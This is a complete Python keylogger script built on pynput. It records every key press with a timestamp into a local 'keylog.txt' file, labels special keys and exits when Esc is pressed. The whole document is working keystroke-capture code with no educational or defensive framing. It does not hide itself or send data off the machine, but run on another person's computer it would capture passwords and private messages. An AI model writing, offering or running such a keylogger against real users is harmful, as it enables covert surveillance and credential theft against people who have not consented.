from pynput.keyboard import Key, Listener
from datetime import datetime

# File to store logs
log_file = "keylog.txt"

# Function to get the current time formatted as a string
def get_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Function to write key press to the log file
def write_to_file(key):
    try:
        with open(log_file, "a") as file:
            # Add timestamp for each key press
            timestamp = get_timestamp()
            file.write(f"[{timestamp}] ")

            # Handle special keys with user-friendly representations
            if key == Key.space:
                file.write("SPACE ")
            elif key == Key.enter:
                file.write("ENTER ")
            elif key == Key.tab:
                file.write("TAB ")
            elif key == Key.backspace:
                file.write("[BACKSPACE] ")
            elif key == Key.shift:
                file.write("[SHIFT] ")
            elif key == Key.ctrl_l or key == Key.ctrl_r:
                file.write("[CTRL] ")
            elif key == Key.alt_l or key == Key.alt_r:
                file.write("[ALT] ")
            elif key == Key.esc:
                file.write("[ESC] ")
            else:
                file.write(str(key).replace("'", "") + " ")

            file.write("\n")
    except Exception as e:
        print(f"Error writing to file: {e}")

# Function called when a key is pressed
def on_press(key):
    write_to_file(key)

# Function called when a key is released
def on_release(key):
    if key == Key.esc:  # Exit on pressing Esc
        return False

# Listen for keyboard events
with Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger running... Press 'Esc' to stop.")
    listener.join()

